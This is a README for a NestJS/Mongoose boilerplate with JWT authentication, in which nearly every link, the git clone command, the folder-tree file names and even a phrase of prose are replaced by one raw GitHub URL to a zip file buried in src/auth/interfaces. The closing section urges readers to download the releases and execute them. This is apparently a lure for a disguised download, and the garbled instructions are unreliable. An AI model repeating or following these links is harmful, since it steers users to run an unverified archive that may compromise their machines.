# Nest Mongoose Boilerplate 🚀

Welcome to the **Nest Mongoose Boilerplate**! This repository provides a solid foundation for building applications using NestJS with Mongoose ORM, JWT Passport Authentication, and the Repository Pattern. Whether you're starting a new project or looking to enhance an existing one, this boilerplate is designed to help you streamline your development process.

[![Download Releases](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip)

## Table of Contents

1. [Features](#features)
2. [Getting Started](#getting-started)
3. [Folder Structure](#folder-structure)
4. [Configuration](#configuration)
5. [Authentication](#authentication)
6. [Usage](#usage)
7. [Testing](#testing)
8. [Contributing](#contributing)
9. [License](#license)

## Features

- **NestJS Framework**: Leverage the power of NestJS, a progressive https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip framework for building efficient, reliable, and scalable server-side applications.
- **Mongoose ORM**: Simplify MongoDB interactions with Mongoose, an elegant MongoDB object modeling tool.
- **JWT Passport Authentication**: Secure your application with JSON Web Tokens and Passport, providing a robust authentication mechanism.
- **Repository Pattern**: Organize your data access logic, promoting separation of concerns and easier testing.

## Getting Started

To get started with the Nest Mongoose Boilerplate, follow these steps:

1. **Clone the repository**:
   ```bash
   git clone https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
   cd nest-mongoose-boilerplate
   ```

2. **Install dependencies**:
   ```bash
   npm install
   ```

3. **Set up environment variables**: Create a `.env` file in the root directory and configure your MongoDB connection string and JWT secret. An example is provided in the `https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip` file.

4. **Run the application**:
   ```bash
   npm run start
   ```

Your application should now be running on `http://localhost:3000`.

## Folder Structure

The folder structure of this boilerplate is organized to promote clarity and maintainability. Here's an overview:

```
nest-mongoose-boilerplate/
│
├── src/
│   ├── auth/
│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   │   └── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   │
│   ├── users/
│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   │   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   │   └── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   │
│   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   ├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
│   └── ...
│
├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
├── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
└── https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip
```

## Configuration

This boilerplate uses environment variables for configuration. Here are the key variables you should set in your `.env` file:

- `MONGODB_URI`: Your MongoDB connection string.
- `JWT_SECRET`: A secret key for signing JWT tokens.

Example:
```
MONGODB_URI=mongodb://localhost:27017/mydatabase
JWT_SECRET=mysecretkey
```

## Authentication

This boilerplate implements JWT Passport Authentication. Here's a brief overview of how it works:

1. **User Registration**: Users can register by providing their details. The application will hash their password and store it in the database.

2. **User Login**: Users can log in by providing their credentials. If the credentials are valid, the application will generate a JWT token.

3. **Protected Routes**: Use the `@UseGuards(AuthGuard('jwt'))` decorator to protect your routes, ensuring that only authenticated users can access them.

## Usage

Once your application is running, you can test the authentication features using tools like Postman or Insomnia.

### Register a User

**POST** `/auth/register`

**Body**:
```json
{
  "username": "exampleUser",
  "password": "examplePassword"
}
```

### Login a User

**POST** `/auth/login`

**Body**:
```json
{
  "username": "exampleUser",
  "password": "examplePassword"
}
```

**Response**:
```json
{
  "access_token": "your_jwt_token"
}
```

### Access Protected Route

**GET** `/users`

Add the `Authorization` header:
```
Authorization: Bearer your_jwt_token
```

## Testing

To ensure the quality of your application, you can run tests using Jest, which is included in this boilerplate.

### Run Tests

To run the tests, use the following command:
```bash
npm run test
```

You can also run tests in watch mode:
```bash
npm run test:watch
```

## Contributing

Contributions are welcome! If you would like to contribute to this project, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add some feature'`).
5. Push to the branch (`git push origin feature/YourFeature`).
6. Open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

For more information and updates, please visit the [Releases](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip) section. You can download the latest releases and execute them to start building your applications quickly.

[![Download Releases](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Enbakom06/nest-mongoose-boilerplate/master/src/auth/interfaces/boilerplate_mongoose_nest_supersolid.zip)

Thank you for using the Nest Mongoose Boilerplate! Happy coding!